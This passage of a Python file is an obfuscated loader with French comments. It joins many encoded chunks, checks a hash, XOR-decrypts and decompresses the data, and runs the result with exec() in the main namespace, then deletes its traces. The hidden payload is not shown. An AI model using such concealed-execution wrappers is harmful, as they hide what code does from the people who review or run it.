_cyNmp4lu0T7KZ4 + _clUsP0CgFlsIC3 + _cnJcFHtlZgLLgZ + _ce_xCFNh8PScVX + _cdaIVB3cu2BvBF + _cwvEXXl1yAA8Kg + _cnbMNlJ0fy238a + _cc2ZSvEDrzCkJs + _ch8_ezoeYBQOoI + _ckUozqquXiifxP + _cyB3j8NIWcfZUV + _cwMwCwd6RN22Hx + _ckEkzQno01WrD8 + _c_F5lTv51em1Sl + _cae9CFsPDlPjid + _ctIq1L_bGh5wAi + _cdkdvlEyuJ3GeA + _cjFtgXUAUNKRv5 + _crsAkR1z06YPh0 + _cwuDsMzA7wpSZz + _cpZn9QHN2Qs6_P + _ccV3RSqvGfq2Ii + _cnKUUe4zbkzFsz + _cnlIfd0dVWTisa + _cjigtVx1Csd7D7 + _cpIz6QAMkUY16U + _cm1Ey4ZtHYAKCj + _cjjMK1ad8FHHR0 + _clTPq6VHTaZZI0 + _cwe7TOCcxtbMbn + _cbko16QUKJpDDr + _cc1NRQ0R4whvTj + _cbBr_WW9EQFhzy + _cmWyx5ojylcf9e + _cxPDLAjGB02qhw + _cbauQ3EMMUQl3D + _cyydxrCz3g4fZi + _cgmpGh1NQsDFkq + _cgWhZ5R7GkkmEJ + _ctjHuDc9nkkaob + _cp23dKsHCBOjBo + _czq481jXmjiSb3 + _cir3UW_kinnYOs + _cxOuFfKN7H3S7R + _caLyMhDlBhrDYX + _czhCdhIy8BITBf + _cvHZ6_fOypSmut + _cd2ropy4LY9SKH + _cneNGr3IzlnpHB + _capnn0KAAOrCQh + _clhES7TcYQsAOX + _caMd4dUzqspZAd + _cxhRHiXg7N620D + _caiqMWIUby9hfd + _cgKo2VvkqL9kuz + _crn2mkzzxo2UU5 + _cjpkpUq7GzPgb9 + _cryQpXPsFQrNSJ + _cxUbO7qL4fLW_2 + _ctuLvEIPsojtvz + _cmcIPcOOqF2Kvg + _ciESoE78hu4ejW + _cwijbv5a4l5uRA + _coelZ0bLh_y3wT + _coV5QozyW4tPxx + _cdSlaI3jwz73ZH + _chTScTkoEZ0l1Z + _cetLDeBkbXN30H + _cnOSaSG8WZYEXh + _cxVQ5gQWOZVMKr + _c_UYUnvMuvQNVs + _chfbbzZnQLg8Ng + _cgSZrSiMjsAR0o + _coGC_kiP9lhbrN + _comxtqYCEYLc0W + _czOotq4T5GMwEH + _cuPQsm00VugFxw + _cqqFbZm9S1uVco + _chFsJnYupYXMKB + _cmKORfVGMwGOlA + _cbTqGSK1qa3xSP + _cfAlR5iTZZmLFo + _cmwwGNiL7QHn8o + _cvKIa3Hgn6GXYP + _cgHUU4ImKu5uWV + _cx8S_GbNS6VlSG + _cd2z1KRa0u_hce + _cvZRMyxwVCl30V + _crLND6Uurn8yCM + _cnv5Cy6ijzElh4 + _cy9ktxCWEVGC2A + _cx1N1U1Ig0XEwp + _cjGh5gz6Cpgvw7 + _ciAd8pvH8c3V1O + _cc5LJYWoyyBMHL + _cyFo1zri2tLXPI + _cjy_049M2GRaBy + _cdYeezOVdZ8l4D + _cd3xqvqatHWLVf + _cti9EzzDCxtL0D + _cyCwUzqcHqhmxq + _cvKu4kK4dCKiwG + _cdSSMnOxMbMh0R + _cv57gNC3aaWcHj)
if __import__('hashlib').sha256(_pbrwEbaiMmdEW1).hexdigest() != 'd8ab2086d7ea5e575bbc6c2da87907e1e6a1be58d82dc1350101e7c3d0f5641b':
    __import__('sys').exit(1)
_xaebZ8Fzf49Yax = bytes([118, 243, 255, 153, 115, 102, 241, 232, 92, 58, 237, 153, 196, 62, 49, 77, 156, 63, 235, 31, 13, 82, 1, 29])
_fkqxIRG5xDiKI87 = bytes([43, 18, 246, 132, 204, 7, 221, 162, 46, 125, 193, 116, 224, 155, 208, 56, 32, 109, 17, 59, 238, 162, 117, 29])

def _fxumCpZvewKZi3Y(_bbh31rkYgZiqTp, _kpNcPh8TVc_AMw):
    return bytes(_bbh31rkYgZiqTp[_irrSYtm6U24v8K] ^ _kpNcPh8TVc_AMw[_irrSYtm6U24v8K % len(_kpNcPh8TVc_AMw)] for _irrSYtm6U24v8K in range(len(_bbh31rkYgZiqTp)))

def _fdfG5uAT7T5ls2Y(_tlA_OOtV2HOd9N):
    import zlib
    return zlib.decompress(_tlA_OOtV2HOd9N) # Un seul niveau de zlib ici pour simplifier

def _fecR58Ts6aRk3UG():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xcYBVKTtUMQSbR = _fxumCpZvewKZi3Y(_pbrwEbaiMmdEW1, _xaebZ8Fzf49Yax)
    # 2. Décompression Zlib
    _daM2DQmSgiCeZe = _fdfG5uAT7T5ls2Y(_xcYBVKTtUMQSbR)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _daM2DQmSgiCeZe.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nrfzuudvw1loSq = _main.__dict__
    _nrfzuudvw1loSq.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nrfzuudvw1loSq)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fecR58Ts6aRk3UG()
try:
    del _fxumCpZvewKZi3Y, _fdfG5uAT7T5ls2Y, _fecR58Ts6aRk3UG
    del _pbrwEbaiMmdEW1, _xaebZ8Fzf49Yax, _fkqxIRG5xDiKI87
except:
    pass
